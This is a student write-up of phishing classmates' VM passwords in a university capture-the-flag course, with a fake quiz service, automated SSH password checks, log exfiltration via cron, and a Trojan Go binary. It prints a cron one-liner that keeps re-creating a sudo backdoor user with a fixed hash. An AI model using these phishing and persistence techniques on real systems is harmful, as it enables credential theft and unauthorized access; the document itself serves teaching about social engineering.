# Phishing cybersecurity students
---
*Authors: [Martin Řepa](https://www.linkedin.com/in/martinrepa), [Lukáš Forst](https://forst.pw)*

Phishing has been recently the most efficient attack. It exploits human naivity and none vigilance - attack vector which is actually very hard to defend. 

Altough the phising attacks are mostly targeted on the common internet users, because it is much harder to trick advanced users, in the following text, we describe how we managed to phish passwords of cyber-security students.

## Background

During practices within cyber-security related subject we were split into two-man teams to play the Capture The Flag challenge and practise techniques we learnt. Each team owned one virtual machine in a virtual network. Everything was allowed - except the (D)DOS attacks.

## First Assignment

Our first task was to use [nmap](https://nmap.org/) to discover secret services on secret machines within our virtual network and, lastly, find the token. Many jokes and baits were set up to confuse our search. One service, for example, offered the following URL - [https://bit.ly/take-your-token](https://bit.ly/take-your-token). Another one returned following ASCI art.

```
<HEADER>
<TITLE>Nope!</TITLE>
<P>
 -----------------------------------------------------
 This is not the port you are looking for. Try harder!
 ----------------------------------------------------- 
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

https://linuxgazette.net/issue67/orr.html
</P>
</BODY>
```

### Let's have some fun
After we found our token, we got an idea to make our service to confuse our school mates. Firstly, we launched a simple python HTTP server, which was just replying following text:

```bash
> The ip 192.168.1.150 might be useful :P
``` 
Of course, this IP was not useful at all. Yeah, now, to me, it seems unnecessarily mean as well. Nonetheless, we thought we could do much more. 

As we knew the username to our machine (duh), which was `class`, we worked with the precondition that all VMs have the same user. To gain access, we needed "just" a password, which was generated by the teachers, and in our case, it started with color - i.e. `blue9834` or `green7562`.


### Just ask for the password
We created simple TCP service running on port 80, asking for passwords multiple times, then terminating the connection and printing passwords to the simple log. By asking for passwords, we mean asking for passwords - nothing sophisticated.

```
> Please insert password to your VM to proof you're a human:
```
We thought nobody would take the bait, and the story ends for us. The end.

#### Even experts can be fooled
Well, we couldn't be more wrong. As all the students were trying to the get the token and scanning the network, our service was discovered really quickly, and we noticed that the logs are full of strings produced by the `nmap` 
```
// nmap scan example
Iteration 1 response:Connection with: "('192.168.1.230', 49488)":
I will ask them 7 times for a password
Iteration 0 response:GET / HTTP/1.0
```
or by random inputs from the users.
```
// user input example
Connection with: "('192.168.1.230', 49558)":
I will ask them 8 times for a password
Iteration 0 response:htrhthrt
Iteration 1 response:hrthrthrth
Iteration 2 response:rthhrthrth
```

After a while, we noticed that some user inputs start with the color (`blue`, `green`) and match the same pattern as our password does. 
```
// user input example with password
Connection with: "('192.168.1.230', 49554)":
I will ask them 2 times for a password
Iteration 0 response:green234
```

We tried to log in to the victim's VM using default `class` user and the `<color><number>` password we found in the log and.... voila we are in.
```bash
> ssh class@192.168.1.230
// password green234
> class@ubuntu16:~$ 
```
Of course, we were surprised how easy it was. What was even more surprising was the fact that we did steal multiple passwords, so not just one user, but three of them gave us their passwords. And of course, we did steal all their flags (unfortunately, we did not get additional points for them).

To be honest, we did not expect stealing any password. It was just for fun. However, this motivated us to go further.

### Let's fake real service
We knew that just the straightforward asking for the password looks way to suspicious, so we tried to behave like some real service, that was programmed by a teacher to verify the knowledge of the students.

To do that, we created a set of questions that were randomly asked by the server. Full set is on our [Github](https://github.com/LukasForst/BSY/blob/master/hacks/passworder/questions.json).
```json
{
    "question": "What is an ecrypted form of http?",
    "correct": "https"
}
```
The server picked up a few random questions and asked victim if they know the correct answer. If their answer was correct, then the server asked for the password to verify the identity of the victim.
```
> What is an ecrypted form of http?
https
> The default port for SSH is?
22
> Well you got everything correct.
> Now confirm me you're not a robot (or nmap)
> Send me password to your class user in your VM.
not-a-password
```
We also logged the answers.
```json
{
  "timestamp": "2019-10-24 19:31:41.993228",
  "ip": "192.168.1.173",
  "password": "not-a-password"
  "all_answers": [
    "https",
    "22",
    "yes"
  ],
  "correct_answers": 3
}
```
All in all, we started to look like a real service used for the first assignment in the cyber-sec class. Again, we didn't think that we would get any passwords. In spite of class full of pretty smart students, few of them fell for the trap, and we gained access to 2 additional VMs.

### Automating the password verification
As the log file grew, we were not ablfacte to check all the provided passwords, so we had to automate the password checking. We used the very same service to check the provided password by trying to connect via SSH to the victim's VM with the default `class` username. 
```json
{
  ...,
  "ip": "192.168.1.173",
  "found_password": false,
  ...
}
```
Then we could occasionally check the log just for the records with the found passwords. We used a nice tool called [JQ](https://stedolan.github.io/jq/) for the bash JSON processing and visualization.

```bash
> cat phisingLog.json | jq 'select(.correct_password != null)' | jq
```
and of course, after a while, somebody got caught.
```json
{
  ...
  "ip": "192.168.1.115",
  "correct_password": true,
  "password": "red23434",
  ...
}

```
And again, the default password provided by the teacher... Come on, people, change your password when you get it from somebody else.

### Realizing the mistake
As the server was checking the passwords automatically, we would pick them up, steal the victim's flags and browse their machine for "interesting things". However, we found one record in the log file, where the server found the correct password (and not the default one, which was itself interesting), and we were not able to connect to this particular VM with SSH to steal the flags.

```json
{
  ...
  "ip": "192.168.1.240",
  "correct_password": true,
  "password": "*bXnc4Vd",
  ...
}
```
We don't know for sure what happened, but we suppose that the user gave us his/her password, then realized his/her mistake and must have change it.

This led us to the next improvements.

### Faster than the victim
We realized that we need to create a backdoor to the victim's system, to be able to access the VM even after the user changed the password. As we did not have any experience with creating backdoors, we just tried to create a new Linux user called `default`. This was done automatically when the server successfully verified the password it got from the victim.

### Spreading the infection
We already had passwords and backdoors from the 5 victims, and we started to think about the moving of our server into the victim's VMs, to lower the risk of exposure. Also, we wanted to be able to deploy the server to any computer without installing additional dependencies, so we had to compile our python server into native code using [PyInstaller](https://www.pyinstaller.org/). To compile the code and deploy it to VM was a bit tricky as our local machines had different environments, and the VMs had a completely different environment. After trial and error, we were able (to some extent) to replicate the VMs environment in the specific Docker python image - like really specific, for some reason - the one that worked was:
```
python@sha256:b53bb1ecef1995577aacacaef0a9ce681e3267e2166646eb4788b9d5eff54735
```
The [Makefile](https://github.com/LukasForst/BSY/blob/adece37ec96231843cc5fcae99aa4c71adb4d1fa/hacks/passworder/Makefile) and the used [build script](https://github.com/LukasForst/BSY/blob/adece37ec96231843cc5fcae99aa4c71adb4d1fa/hacks/passworder/build.sh) can be found in the [Git repo](https://github.com/LukasForst/BSY/).

As we managed to compile the server, we were facing another challenge - to get the found passwords from the victim VM to our VM without possibly exposing the found passwords.
Our solution to this problem was... a bit more complicated than it could be. Still, we were lazy and tried not to modify the application itself, so we rather bent the environment the server was running in. We basically used the [Cron](https://en.wikipedia.org/wiki/Cron) and [OpenSSL](https://www.openssl.org/) to encrypt, transfer and decrypt the logs.

The server (on a victim's machine) was producing logs in the plaintext. On the victim's machine, we set up a [cron job](https://github.com/LukasForst/BSY/blob/4fe069dd9e9d39533c15a645627e23148ac8be05/hacks/victim_our.sh#L6), which periodically used OpenSSL to encrypt the logs and to clear the plaintext one. Then the [script](https://github.com/LukasForst/BSY/tree/master/hacks/encryption) running on our VM just picked up the encrypted logs and copied them via SSH to our machine, where the logs were decrypted. 

### Defending the access
Unfortunately, as our password database grew, we were discovered by the teachers.
```
Hi list!

While you do the second assignment, be careful of some fake ports out there!
Never give your password to anyone!

The real assignment do not asks for any password.

Those machines are full of hackers!!

Sebas
```

*The funny thing is that even after this e-mail warning sent to the whole class, we got new password match and therefore new VM to our collection*

We had to ensure that the machines we were operating, stays under our control. As we had the access via a new user `default`, we decided to use (again, not very bright solution, but it gets the work done) the [cron](https://github.com/LukasForst/BSY/blob/c14a40c13504a4fd46d12524f82ed218122c82f9/hacks/victim_our.sh#L8) with this magnificent command.
```bash
(crontab -l 2>/dev/null; echo "*/20 * * * * if [ \$(grep -c '^default:' /etc/passwd) -eq 0 ]; then useradd -m -p p0j1kHlO8H0mE -s /bin/bash default && usermod -aG sudo default; fi") | crontab -
```
What it does is that it checks every 20 minutes that the user with name `default` does exist, and if not, it creates it with our hashed password.

### Summary
By using relatively simple and naive social engineering and phishing techniques, we were able to gain access to 9 virtual machines. The total headcount is then following:

|                                                           | Count|
| -------------                                             |:-------------:|
| Number of students VMs in the network                     | 29
| Unique IPs connecting to our service                      | 12
| Number of students that gave us password                  | 9
| Number of actually hacked machines                        | 7
| Number of VMs with gained access at the end of the course | 3

Apart from the fact that the people that should know how to behave on the internet gave us their passwords to the VMs, we were astonished by the easiness of it. The first version (code here on [Github](https://github.com/LukasForst/BSY/blob/master/hacks/passworder/v1/get_permissions.py)) of the server just asked for the password, nothing less, nothing more.

Regarding the code, unfortunately, we were developing in a hurry on multiple machines as well as on the VM, and for that reason, some code is probably lost. The remainings can be found on the [Github](https://github.com/LukasForst/BSY/tree/master/hacks).


## Second assignment

The second assignment was targeted to utilize [tcpdump](https://www.tcpdump.org/manpages/tcpdump.1.html) and analyze network traffic which we were supposed to capture via our virtual machine. The sequence of desired events occurred periodically every 2 hours.

### The plan

Right after the assignment was published, we got an idea for our next stunt. We planned to spam the local network with traffic, which would stealthily hint our schoolmates to explore our machine. Then we would write simple Golang application, which would try to create a new user on a running machine, which we'd offer for downloading via HTTP server. We assumed somebody would find our traffic, scan our machine, find the HTTP server, download the Golang binary, run it and voilá - we would have access. A simple diagram below describes the plan.

![](https://i.imgur.com/PNb7p2V.png)

To be honest, we were a little sceptical about this plan, because our program would have to ask for root privileges in order to create our backdoor user. Well, let's see what happened. 


### Implementation

We knew we had only two hours to prepare everything if we wanted to get our traffic into every pcap file our schoolmates would capture.

Firstly, we needed all IP addresses of machines of our schoolmates to spam the network with our traffic. That one was easy - we simply took IP address of every host on the network which had ssh port opened. 

Secondly, we had to figure out how to spam the network so the packets would appear in a pcap file (the targeted machines had only TCP port 22 opened). After a while of playing, we found out that UDP packet - sent even to closed port - appears in the captured pcap. That was brilliant; we would just spam random UDP ports with our subliminal message. 

We implemented the UDP spammer as a python3.7 [script](https://github.com/LukasForst/BSY/blob/master/hacks/ncat_spammer/ncat_spammer.py), and an example packet can be seen below:

```
23:57:28.251061 IP 192.168.1.150.60526 > 192.168.1.132.52272: UDP, length 68
E..`..@.@............n.0.L._FROM PORT 80 SERVING /files/ff/1a219642941c4e9d82992318446e7a9e.txt
```

Lastly, we implemented our [Golang application](https://github.com/LukasForst/BSY/tree/master/hacks/go-exploit) which would create the backdoor user for us. Also, to be entirely sure about what's going on, the program would be sending us logs back to our machine via HTTP POST requests about the progress. 

### Results

The following day, we encountered some logs waiting for us:

```json
{
  "msg": "Script launched!",
  "ip": "192.168.1.141"
}
{
  "msg": "Successfuly created user.!! <3",
  "ip": "192.168.1.141"
}
{
  "msg": "Script launched!",
  "ip": "192.168.1.141"
}
{
  "msg": "Error during creating user: exit status 9",
  "ip": "192.168.1.141"
}
{
  "msg": "Script launched!",
  "ip": "192.168.1.141"
}
{
  "msg": "Error during creating user: exit status 9",
  "ip": "192.168.1.141"
}
```

The `exit status 9` indicates that the user already exists. Magnificent. Not only that our program was executed with root privileges straight away, but it was also run multiple times.

Nonetheless, in the end, we collected "only" two new machines to our collection. Unfortunately, we have no track of how many people actually downloaded the binary file. By the way, at the end of the semester, we still have access to those two machines. 

We assume that the reason for having a smaller success was our already known IP address, which could discourage or scare some potential victims. Also, this approach was not so straightforward in comparison with the first one.

## Conclusion

By using a simple Python and Golang coding skill with basic knowledge of Linux tools and with near to zero experience with hacking or social engineering, we were able to gain access to multiple virtual machines belonging to students of [Cyber Security](https://www.fel.cvut.cz/en/education/bk/predmety/47/02/p4702106.html) at FEE CTU.

After finishing all practices, we realize that a lot of situations could be handled in a more sophisticated way. For example, dealing with the same situation today, we would choose to maintain persistence using reverse shell instead of creating user, which can be easily detected.

To sum this up, totally we gained nine accesses to different virtual machines and yet five of them still remain active - even after the "find intruders" class. 


## Appendix

* [Github repository](https://github.com/LukasForst/BSY) with majority of used source-code